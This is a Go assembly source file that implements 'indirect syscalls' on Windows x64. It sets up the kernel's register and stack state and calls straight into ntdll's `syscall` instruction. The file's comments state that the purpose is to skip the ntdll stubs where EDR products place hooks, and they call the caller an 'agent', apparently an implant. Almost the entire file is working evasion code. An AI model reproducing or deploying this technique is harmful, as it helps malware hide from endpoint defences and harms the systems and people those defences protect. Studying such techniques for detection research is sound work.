//go:build windows && amd64
#include "textflag.h"

// indirectSyscall — set up the Windows x64 syscall register state
// and CALL the `syscall` instruction inside ntdll.
//
// Go declaration:
//   func indirectSyscall(ssn uint32, syscallAddr uintptr,
//       a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr)
//
// Windows x64 syscall ABI at the moment `syscall` executes:
//   RAX = SSN
//   R10 = arg1
//   RDX = arg2
//   R8  = arg3
//   R9  = arg4
//   [RSP+0x28] = arg5
//   [RSP+0x30] = arg6
//
// A normal ntdll stub arrives at this state via:
//   mov r10, rcx          ; move arg1 from RCX to R10
//   mov eax, SSN          ; load SSN
//   syscall               ; enter kernel
//   ret                   ; return to caller
//
// We bypass the entry prologue (where EDRs hook) by:
//   1. Setting R10–R9 and RAX ourselves.
//   2. Placing arg5 and arg6 where the kernel reads them.
//   3. CALL'ing directly to the `syscall` instruction address.
//
// The CALL pushes a return address; when the kernel returns via
// SYSRET, RIP lands on ntdll's `ret`, which pops that return
// address and comes back to us. The kernel sees a legitimate
// ntdll frame; a userland unwinder sees a call from the agent —
// the known trade-off of the technique.
//
// Stack layout when `syscall` executes:
//   [RSP+0x00]       = return address (pushed by CALL)
//   [RSP+0x08..0x27] = 32-byte shadow (unused by syscall)
//   [RSP+0x28]       = arg5
//   [RSP+0x30]       = arg6

TEXT ·indirectSyscall(SB),NOSPLIT,$0-80
    // Load the syscall arguments into the register state the
    // kernel expects. Go's ABI passes them on the stack; we move
    // them into the Windows x64 syscall registers.
    MOVQ ssn+0(FP), AX
    MOVQ syscallAddr+8(FP), R15
    MOVQ a1+16(FP), R10
    MOVQ a2+24(FP), DX
    MOVQ a3+32(FP), R8
    MOVQ a4+40(FP), R9
    MOVQ a5+48(FP), R11
    MOVQ a6+56(FP), R12

    // Allocate 0x38 bytes. The 0x30 minimum is 32 bytes of shadow
    // plus 8 for arg5 and 8 for arg6; the extra 8 pads RSP back to
    // a 16-byte boundary, which Windows x64 requires at the point
    // of a CALL.
    //
    // After the CALL pushes 8 bytes, arg5 and arg6 land at
    // [RSP+0x28] and [RSP+0x30] — exactly where the kernel reads
    // them.
    SUBQ $0x38, SP
    MOVQ R11, 0x20(SP)            // arg5
    MOVQ R12, 0x28(SP)            // arg6
    CALL R15
    ADDQ $0x38, SP

    // NTSTATUS comes back in RAX. A few syscalls also return
    // information in RDX (e.g. NtQueryInformation*); capture it.
    MOVQ AX, r1+64(FP)
    MOVQ DX, r2+72(FP)
    RET
    